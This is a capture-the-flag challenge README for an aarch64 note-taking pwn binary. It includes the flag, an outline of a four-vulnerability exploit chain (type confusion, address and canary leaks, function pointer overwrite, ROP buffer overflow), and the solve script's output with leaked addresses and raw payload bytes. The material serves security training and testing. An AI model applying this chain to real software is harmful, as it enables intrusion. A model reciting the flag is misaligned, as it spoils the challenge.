```
To run:
qemu-aarch64 -L /usr/arm-linux-gnueabi ./note_keeper_arm
```

### Description
I wrote a note taker app for my favorite architecture. Can you pwn it? (aarch64 pwn)

### Difficulty
9/10 (Difficult)

### Flag
pctf{arm_expl0itation_is_pr3tty_co0l}

### Hints
qemu-aarch64 can run the problem

### Author
Christopher Roberts (caffix)

### Tester
me?

### Writeup
```bash
QEMU_LD_PREFIX=/usr/aarch64-linux-gnu/ python solve.py
```
solve.py in repo
Chain together four separate vulnerabilities together.
Type confusion -> into PIE/binary stack leak -> function ptr overwrite
-> into stack info leak -> into buffer overflow w/ ropping
No libc provided. The payload is a open/read/write on flag.txt

### Note:
The challenge is in aarch64 and I compile it inside the docker container.
Make sure to provide the note_keeper_arm binary from INSIDE the container.
docker cp <docker id>:/srv/app/note_keeper_arm .

Also I'm pretty sure ASLR doesn't work for qemu-user, so you might not need
the binary offset leak for PIE lol. It's always been at 0x4000000000

### Given to user
- note_keeper_arm (FROM THE DOCKER CONTAINER)

### Running the solve output
If offsets change from docker the solve.py will need to be modified
```bash
(angr_pwn2) ➜  arm1 QEMU_LD_PREFIX=/usr/aarch64-linux-gnu/ python solve.py
[*] '/home/chris/ctf/patriotctf2023/arm1/docker_copy'
    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 5001: Done
b'Note taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\nNote ID:\nNote length: [MAX 99 CHARACTERS]\nNote length too long try again\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\nInvalid choice\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\n'
got exit function address 0x4000000b8c
Program is based at 0x4000000000
b':\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\nInvalid choice\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\n'
b'Note ID:\n'
Sending buffer
b'Old note ID, using old length\nMessage:\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\nInvalid choice\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\n'
Got stack cookie : 0x87f2243c9a8c8f00
b'Note ID:\n'
Sending buffer
b'Old note ID, using old length\nMessage:\n'
b'Note taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\nInvalid choice\nNote taker menu:\n[1] Create note\n[2] View note\n[3] Delete note\n[4] Quit\n'
[*] Switching to interactive mode
Beep Boop. TeXt T0 $P3ach 1s d0wn, s0 y0u'1l h4v3 t0 m@nage w1th a tr@nscript:
flag.txt\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x98\x0c\x00\x00\x00\x8f\x8c\x9a<$\xf2\x87CCCCCCCC\x9c\x0b\x00\x00\x00DDDDDDDEDDDDDDD\x1c\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00DDDDDDD\x9c\x0b\x00\x00\x00EEEEEEEFEEEEEEE\x03\x00\x00\x00\xb0\x0b\x00\x00\x00 \x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00EEEEEEE\x9c\x0b\x00\x00\x00EEEEEEE\x00\x8c\x9a<$\xf2\x87\x00\x00\x00\xb0\x0b\x00\x00\x00 \x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00EEEEEEE\xa0    \x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Note taker menu:
[1] Create note
[2] View note
[3] Delete note
[4] Quit
Invalid choice
Note taker menu:
[1] Create note
[2] View note
[3] Delete note
[4] Quit
Deleting note
pctf{arm_expl0itation_is_pr3tty_co0l}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00eleting note
[*] Got EOF while reading in interactive
$  
```